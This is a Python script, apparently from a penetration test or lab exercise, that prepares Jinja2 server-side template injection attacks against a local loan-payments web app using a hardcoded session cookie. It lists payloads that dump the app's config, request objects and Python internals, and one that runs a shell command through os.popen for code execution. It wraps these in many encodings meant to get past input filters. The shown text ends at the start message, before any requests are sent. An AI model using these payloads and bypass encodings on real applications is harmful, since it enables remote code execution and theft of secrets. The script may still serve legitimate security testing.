import requests
import json
import urllib.parse
import base64
import html

# Target endpoint
base_url = "http://127.0.0.1:5000"
endpoint = "/total_loan_payments"

# Session cookie from context
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVYRkA.NZrGBUBLWhE1H3H_nJGpmrxsh5A"
cookies = {'session': session_cookie}

# Base SSTI payloads for Jinja2
base_payloads = [
    "{{7*7}}",
    "{{config}}",
    "{{''.__class__}}",
    "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{request}}",
    "{{request.args}}",
    "{{request.cookies}}",
    "{{request.headers}}",
    "{{request.environ}}",
    "{{config.items()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__}}",
    # JSON context specific payloads
    '{"test": "{{7*7}}"}',
    '{"user": "{{config}}"}',
    '{"data": "{{request.application.__globals__.__builtins__.__import__(\\'os\\').popen(\\'id\\').read()}}"}',
    "{\"inject\": \"{{''.__class__.__mro__[1].__subclasses__()}}\"}",
]

# Encoding functions
def url_encode(payload):
    return urllib.parse.quote(payload)

def double_url_encode(payload):
    return urllib.parse.quote(urllib.parse.quote(payload))

def base64_encode(payload):
    return base64.b64encode(payload.encode()).decode()

def html_entity_encode(payload):
    return html.escape(payload)

def hex_encode(payload):
    return payload.encode().hex()

def unicode_escape_encode(payload):
    return ''.join(f'\\u{ord(c):04x}' for c in payload)

def mixed_encode_1(payload):  # URL encode only template chars
    return payload.replace('{{', '%7B%7B').replace('}}', '%7D%7D')

def mixed_encode_2(payload):  # HTML encode only brackets
    return payload.replace('{{', '&#123;&#123;').replace('}}', '&#125;&#125;')

def utf8_overlong_encode(payload):  # Overlong UTF-8 for template chars
    result = payload
    result = result.replace('{', '%C0%AB')
    result = result.replace('}', '%C0%BB')
    return result

# Build comprehensive test cases
test_cases = []

def add_test_case(category, encoding_name, payload):
    test_cases.append({
        'category': category,
        'encoding': encoding_name,
        'payload': payload,
        'display_payload': payload if len(payload) <= 100 else payload[:100] + "..."
    })

# Test 1: Raw payloads (no encoding)
for idx, payload in enumerate(base_payloads):
    add_test_case("raw", "none", payload)

# Test 2: URL encoded versions
for idx, payload in enumerate(base_payloads):
    add_test_case("url_encoded", "url_encode", url_encode(payload))

# Test 3: Double URL encoded
for idx, payload in enumerate(base_payloads):
    add_test_case("double_url_encoded", "double_url_encode", double_url_encode(payload))

# Test 4: HTML entity encoded
for idx, payload in enumerate(base_payloads):
    add_test_case("html_entity_encoded", "html_entity_encode", html_entity_encode(payload))

# Test 5: Hex encoded
for idx, payload in enumerate(base_payloads[:3]):  # Limit for brevity
    add_test_case("hex_encoded", "hex_encode", hex_encode(payload))

# Test 6: Unicode escape encoded
for idx, payload in enumerate(base_payloads[:3]):
    add_test_case("unicode_escape_encoded", "unicode_escape_encode", unicode_escape_encode(payload))

# Test 7: Base64 encoded
for idx, payload in enumerate(base_payloads[:3]):
    add_test_case("base64_encoded", "base64_encode", base64_encode(payload))

# Test 8: Mixed encoding 1 (URL encode only template delimiters)
for idx, payload in enumerate(base_payloads[:3]):
    add_test_case("mixed_url_only_delimiters", "mixed_encode_1", mixed_encode_1(payload))

# Test 9: Mixed encoding 2 (HTML encode only template delimiters)
for idx, payload in enumerate(base_payloads[:3]):
    add_test_case("mixed_html_only_delimiters", "mixed_encode_2", mixed_encode_2(payload))

# Test 10: UTF-8 overlong encoding
for idx, payload in enumerate(base_payloads[:3]):
    add_test_case("utf8_overlong_encoded", "utf8_overlong_encode", utf8_overlong_encode(payload))

# Test 11: JSON context specific encodings
json_specific = [
    '{{7*7}}',  # In JSON string
    '{{7*7}}',  # As JSON value without quotes
    '{"calc": "{{7*7}}"}',  # Embedded in JSON
    '{"calc": "{{config}}"}',
    '{"data": {"nested": "{{request.args}}"}}',
]

for payload in json_specific:
    add_test_case("json_context", "raw", payload)
    add_test_case("json_context", "url_encoded", url_encode(payload))

print(f"[*] Starting comprehensive SSTI filter bypass test")
